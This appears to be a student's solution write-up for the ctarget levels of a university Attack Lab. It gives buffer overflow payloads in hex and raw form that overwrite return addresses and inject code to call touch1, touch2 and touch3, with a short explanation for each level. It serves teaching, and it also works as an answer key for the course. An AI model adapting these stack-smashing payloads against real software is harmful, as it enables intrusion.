ctarget:

Level 1
Bytes to be entered: 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00

Raw string: \00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C0@\00\00\00\00\00

What I did with the string:
The size of the stack frame allocated by getbuf() is 0x28 bytes, so the return address is stored in 0x28(%rsp) (before the stack frame is deallocated). I just have to write at that address the starting address of the function touch1(), which is 0x4017c0. 


Level 2
Bytes to be entered:
bf fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55

Raw string:
\BF\FA\97\B9Yh\EC@\00\C3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00x\DCaU

What I did with the string:
The injected code is stored in (%rsp) (before deallocation), so we just need to return to (%rsp) (before deallocation) after executing the body of getbuf(). That means, starting at the 41st byte, the bytes should be the value of %rsp, which is %5561dc78. Then, starting at the 1st byte, we need to store the injected machine code. The assembly code is stored in level2.s and the disassembled version is in level2.d. I have left a comment for each line of code in level2.s.


Level 3
Bytes to be entered:
48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61

Raw string:
H\C7Ç¨\DCaUh\FA@\00\C3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00x\DCaU\00\00\00\0059b997fa

What I did with the string:
The injected code can still be stored at (%rsp) (before deallocation), but the string cannot be stored in the stack frame for getbuf(). Because when switching control to injected code, the stack frame for getbuf() is already deallocated. The touch3(), hex(), and injected code will push the stack 5 times in total, completely overwriting the original stack frame. Therefore, we can put the string at 0x8(%rsp). 
Note that the string (cookie) should be given in hex representation.
